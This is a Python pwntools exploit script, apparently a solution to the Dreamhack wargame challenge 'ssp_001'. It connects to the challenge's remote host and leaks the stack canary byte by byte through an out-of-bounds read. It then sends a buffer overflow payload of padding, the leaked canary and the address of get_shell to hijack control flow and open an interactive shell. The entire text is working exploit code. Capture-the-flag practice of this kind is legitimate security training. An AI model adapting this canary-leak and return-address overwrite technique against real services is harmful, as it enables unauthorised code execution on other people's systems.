from pwn import *

#context.log_level = "debug"

#p = process("./ssp_001")
p = remote("host1.dreamhack.games",20476)
e = ELF("./ssp_001")

canary = b"0x"
get_shell = e.symbols["get_shell"]

p.recvuntil("> ")

def canary_leak(num):
	p.sendline(b"P")
	p.recvuntil(": ")
	p.sendline(str(num))

	p.recvuntil("is : ")

	return p.recv()[:2]

canary += canary_leak(131)
canary += canary_leak(130)
canary += canary_leak(129)
canary += canary_leak(128)

canary = int(canary, 16)

print("Canary : "+hex(canary))

payload = b"\x90" * 64 #name
payload += p32(canary) #canary
payload += b"\x90" * 8 #sfp & 4bytes dummy
payload += p32(get_shell) #ret


p.sendline("E")
p.recvuntil("Size : ")

p.sendline(str(len(payload))) #payload length

p.recvuntil("Name : ")

p.sendline(payload)

p.interactive()
